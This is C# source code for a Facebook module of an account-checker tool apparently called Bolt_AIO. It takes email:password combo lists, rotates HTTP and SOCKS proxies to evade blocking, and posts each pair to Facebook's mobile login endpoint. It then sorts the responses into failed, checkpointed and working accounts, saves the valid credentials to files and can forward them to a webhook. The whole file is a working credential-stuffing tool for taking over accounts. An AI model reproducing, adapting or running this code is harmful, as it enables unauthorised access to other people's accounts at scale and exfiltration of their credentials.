using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading;
using BoltCUI;
using Leaf.xNet;

namespace Bolt_AIO
{
    internal class Facebookmod
    {
        public static List<string> Combos = Program.Combos;
        public static int Combosindex;

        public static void Check()
        {
            for (;;)
            {
                if (Program.Proxyindex > Program.Proxies.Count() - 2) Program.Proxyindex = 0;
                try
                {
                    Interlocked.Increment(ref Program.Proxyindex);
                    using (var req = new HttpRequest())
                    {
                        if (Combosindex >= Combos.Count())
                        {
                            Program.Stop++;
                            break;
                        }

                        Interlocked.Increment(ref Combosindex);
                        var array = Combos[Combosindex].Split(':', ';', '|');
                        var text1 = array[0] + ":" + array[1];
                        try
                        {
                            switch (Program.ProxyType1)
                            {
                                case "HTTP":
                                    req.Proxy = HttpProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                                case "SOCKS4":
                                    req.Proxy = Socks4ProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                                case "SOCKS5":
                                    req.Proxy = Socks5ProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                            }

                            req.UserAgent =
                                "Mozilla/5.0 (iPhone; CPU iPhone OS 8_0_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12A366 Safari/600.1.4";
                            req.IgnoreProtocolErrors = true;
                            req.AllowAutoRedirect = true;
                            var str =
                                "m_ts=1550180232&li=iN9lXBSfEc8xIHSKjFOe2vkx&try_number=0&unrecognized_tries=0&email=" +
                                array[0] + "&pass=" + array[1] +
                                "&prefill_contact_point=&prefill_source=&prefill_type=&first_prefill_source=&first_prefill_type=&had_cp_prefilled=false&had_password_prefilled=false&is_smart_lock=false&m_sess=&fb_dtsg=AQF6C0mj3hNf%3AAQGjTNnbLzLJ&jazoest=22034&lsd=AVri6wcw&__dyn=0wzp5Bwk8aU4ifDgy79pk2m3q12wAxu13w9y1DxW0Oohx61rwf24o29wmU3XwIwk9E4W0om783pwbO0o2US1kw5Kxmayo&__req=9&__ajax__=AYkbGOHTAqPBWedhRIHfEH-kFiBJmDdmTayxDqjTS3OQBinpNmq9rxYX3qOAArwuR2Byhhz4HJlxUBSye6VR7b6k2h4OiJeYukTQr8fy1wnR6A&__user=0";
                            req.SslCertificateValidatorCallback =
                                (RemoteCertificateValidationCallback) Delegate.Combine(
                                    req.SslCertificateValidatorCallback,
                                    new RemoteCertificateValidationCallback((obj, cert, ssl, error) =>
                                        (cert as X509Certificate2).Verify()));
                            var strResponse =
                                req.Post(
                                    "https://m.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100",
                                    str, "application/x-www-form-urlencoded").ToString();
                            {
                                if (strResponse.Contains("provided_or_soft_matched") ||
                                    strResponse.Contains("oauth_login_elem_payload"))
                                {
                                    Program.Fails++;
                                    Program.TotalChecks++;
                                }
                                else if (strResponse.Contains("checkpoint"))
                                {
                                    Program.Frees++;
                                    Program.TotalChecks++;
                                    if (Program.lorc == "LOG")
                                        Settings.PrintFree("Facebook", array[0] + ":" + array[1]);
                                    Export.AsResult("/Facebook_frees", array[0] + ":" + array[1]);
                                }
                                else if (strResponse.Contains("save-device"))
                                {
                                    Program.Hits++;
                                    Program.TotalChecks++;
                                    Export.AsResult("/Facebook_hits", array[0] + ":" + array[1]);
                                    if (Program.lorc == "LOG") Settings.PrintHit("Facebook", array[0] + ":" + array[1]);
                                    if (Settings.sendToWebhook)
                                        Settings.sendTowebhook1(array[0] + ":" + array[1], "Facebook");
                                }
                            }
                        }
                        catch (Exception)
                        {
                            Program.Combos.Add(text1);
                        }
                    }
                }
                catch
                {
                    Interlocked.Increment(ref Program.Errors);
                }
            }
        }

        private static string Parse(string source, string left, string right)
        {
            return source.Split(new string[1] {left}, StringSplitOptions.None)[1].Split(new string[1]
            {
                right
            }, StringSplitOptions.None)[0];
        }

        public static string Base64Encode(string plainText)
        {
            return Convert.ToBase64String(Encoding.UTF8.GetBytes(plainText));
        }
    }
}